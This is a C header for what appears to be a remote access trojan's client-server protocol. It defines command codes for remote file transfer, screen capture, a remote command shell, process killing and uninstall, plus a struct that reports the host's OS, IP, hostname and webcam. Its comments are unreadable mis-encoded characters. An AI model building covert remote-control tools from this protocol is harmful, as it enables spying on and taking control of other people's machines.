#pragma  once

#include <windows.h>

//IOCP��Ϣ��
#define	NC_CLIENT_CONNECT		0x0001
#define	NC_CLIENT_DISCONNECT	0x0002
#define	NC_TRANSMIT				0x0003
#define	NC_RECEIVE				0x0004
#define NC_RECEIVE_COMPLETE		0x0005 // ��������
//����������
#define  MAX_RECVBUF_SIZE   1024*20
#define  MAX_SENDBUF_SIZE   1024*20
#define  timeout            20      //��������� 30��

enum
{
    //���������
    COMMAND_DIR = 0X00,
    COMMAND_FILE_OPEN,
    COMMAND_FILE_BEGIN,
    COMMAND_OPEN_FILEDLG,               //���ļ��Ի���
    COMMAND_PANFU,                      //�̷���Ϣ��
    COMMAND_FILE_DIR,                   //���ļ�Ŀ¼
    COMMAND_FILE_Size,                  //�ļ���С
    COMMAND_FILE_Data,                  //�����ļ�
    COMMAND_FILE_Down,                  //�ļ�����
    COMMAND_CONTINUE,                   //�������ļ���
    COMMAND_FILE_END,                   //�ļ��������
    COMMAND_FILE_TRANSFMODE,            //����ģʽ
    COMMAND_FILE_TRANSFMODE_CANCEL,     //ȡ��
    COMMAND_FILE_TRANSFMODE_COVER,      //����
    COMMAND_FILE_TRANSFMODE_CONTINUE,   //����

    COMMAND_Screen,
    COMMAND_Screen_OPEN,
    COMMAND_Screen_BEGIN,               //���ṹ��
    COMMAND_Screen_DATA,                //��������

    COMMAND_CMD,
    COMMAND_CMD_OPEN,
    COMMAND_CMD_BEGIN,
    COMMAND_CMD_DATA,

    COMMAND_PROCESS,                //��������������Ϣ
    COMMAND_PROCESS_OPEN,           //�ͻ��˷��ʹ򿪽��̴���
    COMMAND_PROCESS_BEGIN,          //����˴��ڴ򿪿��Կ�ʼ��������
    COMMAND_PROCESS_DATA,           //�������ݵ������
    COMMAND_PROCESS_KILL,           //��������
    COMMAND_PROCESS_KILL_Success,   //��������ʧ��
    COMMAND_PROCESS_KILL_Fail,      //�������̳ɹ�

    //�ͻ�������
    COMMAND_LOGIN,

    //����
    COMMAND_HEARTBEAT,                //����
    TOKEN_LOGIN,                     //��¼
    COMMAND_Stop                     //ж��
};

typedef struct
{
    DWORD	dwSizeHigh;
    DWORD	dwSizeLow;
}FILESIZE;


struct tagPacketHead
{
    DWORD m_dwSize;     //��ʾ���ĳ���
    DWORD m_dwUnSize;   //��ѹ��Ĵ�С
};

typedef struct
{
    BYTE			bToken;			// = 1
    char	        szOSver[16];	// �汾��Ϣ
    int				CPUClockMhz;	// CPU��Ƶ
    char			szIP[16];		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
    char			HostName[50];	// ������
    bool			bIsWebCam;		// �Ƿ�������ͷ
    DWORD			dwSpeed;		// ����
}LOGININFO;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

void Dbgprintf(char *pszFormat, ...);
bool RecvData(SOCKET s, char* pBuf, int nSize);
bool SendData(SOCKET s, char* pBuf, int nSize);
bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);